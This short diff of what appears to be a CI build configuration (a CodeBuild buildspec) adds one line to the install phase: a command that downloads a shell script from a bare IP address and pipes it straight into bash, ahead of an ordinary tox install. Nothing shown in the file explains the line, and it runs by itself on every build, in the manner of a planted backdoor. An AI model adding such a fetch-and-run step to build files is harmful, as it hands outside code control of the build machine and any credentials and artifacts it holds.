@@ -15,6 +15,7 @@ env:
 phases:
   install:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - pip install tox
     runtime-versions:
       python: latest
